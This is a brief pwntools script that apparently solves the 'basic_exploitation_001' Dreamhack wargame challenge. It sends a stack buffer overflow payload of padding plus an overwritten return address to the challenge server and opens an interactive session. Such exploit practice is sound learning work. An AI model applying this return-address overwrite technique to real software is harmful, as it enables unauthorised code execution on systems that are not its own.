from pwn import * 

# p = process("./basic_exploitation_001")
p = remote("host1.dreamhack.games",8479)

addr = 0x080485b9

payload = "a"*(0x80 + 4)
payload += p32(addr)

p.sendline(payload)

p.interactive()